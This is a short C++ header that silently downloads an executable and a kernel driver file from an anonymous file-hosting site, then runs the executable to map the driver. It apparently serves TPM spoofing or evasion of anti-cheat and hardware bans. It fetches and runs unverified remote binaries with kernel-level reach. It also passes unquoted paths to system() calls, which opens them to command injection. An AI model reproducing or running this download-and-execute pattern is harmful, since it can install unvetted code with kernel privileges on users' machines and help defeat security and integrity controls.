#pragma once

#include <iostream>
#include <string>

using namespace std;

void DownloadMapperAndSys(const string& downloadPath)
{
    string mapperCmd = "curl -s -o " + downloadPath + "\\Mapper.exe https://files.catbox.moe/e3uc78.bin";
    string tpmCmd = "curl -s -o " + downloadPath + "\\tpm.sys https://files.catbox.moe/zuwlxz.sys";

    system(mapperCmd.c_str());
    system(tpmCmd.c_str());
}

void TPMMapper(const string& downloadPath)
{
    string execCmd = downloadPath + "\\Mapper.exe " + downloadPath + "\\tpm.sys";
    system(execCmd.c_str());
}
